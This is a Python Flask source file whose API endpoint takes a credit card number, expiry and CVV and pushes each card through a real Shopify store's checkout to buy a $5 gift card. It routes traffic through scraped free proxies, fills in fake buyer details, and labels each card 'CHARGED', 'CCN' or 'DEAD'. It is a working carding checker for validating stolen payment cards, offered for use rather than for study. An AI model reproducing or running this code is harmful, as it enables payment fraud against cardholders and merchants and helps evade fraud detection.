import time
import requests
import re
from bs4 import BeautifulSoup
import random
import string
from flask import Flask, request, make_response
from flask_cors import CORS

app = Flask(__name__)
CORS(app)


def getProxy(html):
    return re.findall("\\d{1,3}(?:\\.\\d{1,3}){3}(?::\\d{1,5})?", html)

def sendRequest():
    h= {
    "Host": "www.sslproxies.org",
    "sec-ch-ua": "\"Not?A_Brand\";v\u003d\"8\", \"Chromium\";v\u003d\"108\", \"Google Chrome\";v\u003d\"108\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "dnt": "1",
    "upgrade-insecure-requests": "1",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
    "accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
    "sec-fetch-site": "none",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "accept-language": "en-IN,en-GB;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7"
    }
    req=requests.get("https://www.sslproxies.org/", headers=h, verify=False).text 
    return req

def getHTTPProxy():
    proxies=getProxy(sendRequest())
    ok=[]
    for proxy in proxies:
        if len(proxy.split(":"))==2:
           # print(proxy)
            ok.append(proxy)
    ip=ok[0].split(":")[0]
    return {"http"  : "http://"+ok[0]}, ip


def multiexplode(string):
    lista = str(string)
    if lista.__contains__('|'):
        final = lista.split('|')
        return final
    elif lista.__contains__(':'):
        final = lista.split(':')
        return final


@app.route('/api', methods=['GET'])
def handle_request():
    lista = request.args.get("lista")
    cc = multiexplode(lista)[0]
    mes = multiexplode(lista)[1]
    ano = multiexplode(lista)[2]
    cvv = multiexplode(lista)[3]
    cc = f"{cc[0:4]} {cc[4:8]} {cc[8:12]} {cc[12:16]}"
    if len(mes) == 1:
        mes = mes
    if len(ano) == 2:
        ano = "20" + ano
    email = (
        ''.join(random.choices(string.ascii_lowercase + string.digits, k=16)) +
        "%40nospam.today")
    proxy = getHTTPProxy()
    session = requests.Session()
    headers1 = {
        'origin': 'https://sapnap.shop',
        'referer':
        'https://sapnap.shop/collections/gift-cards/products/sapnap-gift-card-1',
        'sec-ch-ua':
        '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent':
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest'
    }
    data1 = r'form_type=product&utf8=%E2%9C%93&id=40236379799713&option-0=%245.00&quantity=1'
    response1 = session.post("https://sapnap.shop/cart/add.js",
                             headers=headers1,
                             data=data1,
                             proxies=proxy)
    headers2 = {
        'referer':
        'https://sapnap.shop/cart',
        'sec-ch-ua':
        '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile':
        '?0',
        'sec-ch-ua-platform':
        '"Windows"',
        'sec-fetch-dest':
        'document',
        'sec-fetch-mode':
        'navigate',
        'sec-fetch-site':
        'same-origin',
        'sec-fetch-user':
        '?1',
        'upgrade-insecure-requests':
        '1',
        'user-agent':
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
    }
    data2 = "updates%5B%5D=1&checkout="
    response2 = session.post("https://sapnap.shop/cart", data=data2,
                             headers=headers2,
                             proxies=proxy)
    mainurl = response2.url
    authenticity_token = re.search(
        'type="hidden" name="authenticity_token" value="(.*?)"',
        response2.text).group(1).strip()
    headers3 = {
        'origin':
        'https://sapnap.shop',
        'referer':
        'https://sapnap.shop/',
        'sec-ch-ua':
        '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile':
        '?0',
        'sec-ch-ua-platform':
        '"Windows"',
        'sec-fetch-dest':
        'document',
        'sec-fetch-mode':
        'navigate',
        'sec-fetch-site':
        'same-origin',
        'sec-fetch-user':
        '?1',
        'upgrade-insecure-requests':
        '1',
        'user-agent':
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
    }
    data3 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=contact_information&step=payment_method&checkout%5Bemail%5D={email}&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbilling_address%5D%5Bfirst_name%5D=john&checkout%5Bbilling_address%5D%5Blast_name%5D=smith&checkout%5Bbilling_address%5D%5Baddress1%5D=newyork+st&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=newyorks+city&checkout%5Bbilling_address%5D%5Bcountry%5D=US&checkout%5Bbilling_address%5D%5Bprovince%5D=New+York&checkout%5Bbilling_address%5D%5Bzip%5D=10080&checkout%5Bbilling_address%5D%5Bphone%5D=9098184881&checkout%5Bbilling_address%5D%5Bcountry%5D=United+States&checkout%5Bbilling_address%5D%5Bfirst_name%5D=john&checkout%5Bbilling_address%5D%5Blast_name%5D=smith&checkout%5Bbilling_address%5D%5Baddress1%5D=newyork+st&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=newyorks+city&checkout%5Bbilling_address%5D%5Bprovince%5D=NY&checkout%5Bbilling_address%5D%5Bzip%5D=10080&checkout%5Bbilling_address%5D%5Bphone%5D=9098184881&checkout%5Bbuyer_accepts_sms%5D=0&checkout%5Bsms_marketing_phone%5D=&checkout%5Bclient_details%5D%5Bbrowser_width%5D=622&checkout%5Bclient_details%5D%5Bbrowser_height%5D=750&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-345'
    response3 = session.post(mainurl,
                             headers=headers3,
                             data=data3,
                             proxies=proxy)
    authenticity_token1 = re.search('name="authenticity_token" value="(.*?)"',
                                    response3.text).group(1).strip()

    headers5 = {
        'Accept':
        'application/json',
        'Accept-Language':
        'en-US,en;q=0.9',
        'Content-Type':
        'application/json',
        'Host':
        'deposit.us.shopifycs.com',
        'Origin':
        'https://checkout.shopifycs.com',
        'Referer':
        'https://checkout.shopifycs.com/',
        'Sec-Fetch-Dest':
        'empty',
        'Sec-Fetch-Mode':
        'cors',
        'Sec-Fetch-Site':
        'same-site',
        'Sec-GPC':
        '1',
        'User-Agent':
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Safari/537.36',
    }
    data5 = {
        "credit_card": {
            "number": cc,
            "name": "john smith",
            "month": mes,
            "year": ano,
            "verification_value": cvv
        },
        "payment_session_scope": "sapnap.shop"
    }
    response5 = session.post('https://deposit.us.shopifycs.com/sessions',
                             json=data5,
                             headers=headers5,
                             proxies=proxy)
    id = response5.json()['id']
    data6 = f'_method=patch&authenticity_token={authenticity_token1}&previous_step=payment_method&step=&s={id}&checkout%5Bpayment_gateway%5D=65127678113&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=%2B19098184881&checkout%5Btotal_price%5D=500&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=622&checkout%5Bclient_details%5D%5Bbrowser_height%5D=750&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-345'
    response6 = session.post(mainurl,
                             headers=headers3,
                             data=data6,
                             proxies=proxy)
    time.sleep(4)
    proc = mainurl + "?from_processing_page=1&validate=true"
    response8 = session.get(proc, headers=headers3, proxies=proxy)

    if response8.text.__contains__(
        "Thank you for your purchase!") or response8.text.__contains__(
        "Your order is confirmed") or response8.text.__contains__(
            "Thank you  john!") or response8.__contains__("Thank you"):
        response = f'''CHARGED \n
         ➤ CC:  {lista}\n
         ➤ Response: $5 Charged \n
         ➤ Gate : Shopify gateway '''.encode("utf-8")
    elif response8.text.__contains__(
        "Security code was not matched by the processor"
    ) or response8.text.__contains__(
            "Security codes does not match correct") or response8.text.__contains__(
            "CVV mismatch") or response8.text.__contains__("CVV2 Mismatch"):
        response = f'''CCN \n
         ➤ CC:  {lista}\n
         ➤ Response: Card security code is incorrect\n
         ➤ Gate : Shopify gateway '''.encode("utf-8")
    else:
        soup = BeautifulSoup(response8.content, 'html.parser')
        error = soup.find('p', {'class': 'notice__text'}).text
        response = f'''DEAD \n
         ➤ CC:  {lista}\n
         ➤ Response: {error} \n
         ➤ Gate : Shopify gateway '''.encode("utf-8")

    print(response)
    response = make_response(response)
    return response


if __name__ == "__main__":
    app.run(host='0.0.0.0', debug=True)
